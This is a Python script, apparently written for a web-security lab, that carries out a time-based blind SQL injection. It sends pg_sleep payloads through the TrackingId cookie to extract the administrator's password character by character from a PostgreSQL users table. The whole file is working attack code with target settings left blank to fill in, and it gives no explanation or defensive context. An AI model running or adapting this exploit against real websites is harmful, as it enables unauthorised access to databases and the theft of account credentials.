import requests
import string
import time

# ===================== SETTINGS =====================
URL = ""                           #TYPE YOUR URL HERE
TRACKING_ID = ""           #TYPE YOUR TRACKING_ID HERE
SESSION = ""          #TYPE YOUR SESSION HERE (cookie)

REQUESTS_PER_SECOND = 3  # Recommended: 2-5 for time-based
PASSWORD_LENGTH = 20
DELAY_SECONDS = 3        # How many seconds to trigger on correct char
# ====================================================

CHARS = string.ascii_lowercase + string.ascii_uppercase + string.digits + "!@#$%^&*"
DELAY = 1 / REQUESTS_PER_SECOND

def check_char(position, char):
    payload = (
        f"{TRACKING_ID}'%3BSELECT+CASE+WHEN+"
        f"(SUBSTRING(password,{position},1)='{char}')+THEN+pg_sleep({DELAY_SECONDS})+ELSE+pg_sleep(0)+END+FROM+users+WHERE+username='administrator'--"
    )
    cookies = {
        "TrackingId": payload,
        "session": SESSION
    }
    print(f"Checking position {position}, char '{char}'...")
    start = time.time()
    try:
        response = requests.get(URL, cookies=cookies, timeout=DELAY_SECONDS + 5)
    except requests.exceptions.Timeout:
        return True  # Timeout = delay triggered = correct char
    elapsed = time.time() - start
    time.sleep(DELAY)
    return elapsed >= DELAY_SECONDS

password = ""
print(f"Cracking password... ({REQUESTS_PER_SECOND} req/sec, {DELAY_SECONDS}s delay trigger)\n")

for i in range(1, PASSWORD_LENGTH + 1):
    found = False
    for char in CHARS:
        if check_char(i, char):
            password += char
            print(f"✓ Char {i}: '{char}' | Password so far: {password}\n")
            found = True
            break
    if not found:
        print(f"✗ Char {i}: not found, skipping\n")

print(f"\nAdministrator password: {password}")
